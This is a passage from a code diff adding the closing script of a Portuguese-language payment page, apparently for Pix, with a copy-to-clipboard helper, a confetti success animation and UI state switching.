+  const code = el.dataset.full || el.textContent;
+  navigator.clipboard.writeText(code).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = code; document.body.appendChild(ta);
+    ta.select(); document.execCommand('copy');
+    document.body.removeChild(ta);
+  });
+  const btn = document.getElementById('btn-copy');
+  btn.textContent = 'Copiado ✓';
+  btn.classList.add('copied');
+  setTimeout(() => { btn.textContent = 'Copiar'; btn.classList.remove('copied'); }, 2500);
+}
+
+// ════════════════════════════════════
+//  TELA DE SUCESSO
+// ════════════════════════════════════
+function showSuccess() {
+  showState('success');
+  launchConfetti();
+}
+
+// ════════════════════════════════════
+//  CONFETTI
+// ════════════════════════════════════
+function launchConfetti() {
+  const colors = ['#FF0000','#4285F4','#34A853','#FBBC05','#EA4335','#0F9D58'];
+  const wrap   = document.getElementById('confetti-wrapper');
+  wrap.innerHTML = '';
+  for (let i = 0; i < 90; i++) {
+    const p = document.createElement('div');
+    p.className = 'confetti-p';
+    Object.assign(p.style, {
+      background:       colors[i % colors.length],
+      left:             Math.random() * 100 + 'vw',
+      animationDelay:   Math.random() * 2.5 + 's',
+      animationDuration:(2.8 + Math.random() * 1.5) + 's',
+      transform:        `rotate(${Math.random() * 360}deg) scale(${0.6 + Math.random() * 0.8})`,
+    });
+    wrap.appendChild(p);
+  }
+  setTimeout(() => wrap.innerHTML = '', 6000);
+}
+
+// ════════════════════════════════════
+//  UTILS
+// ════════════════════════════════════
+function showState(state) {
+  elLoading.style.display = state === 'loading' ? 'flex'   : 'none';
+  elContent.style.display = state === 'pix'     ? 'block'  : 'none';
+  elSuccess.style.display = state === 'success' ? 'flex'   : 'none';
+  elError.style.display   = state === 'error'   ? 'flex'   : 'none';
+}
+</script>
+</body>
+</html>
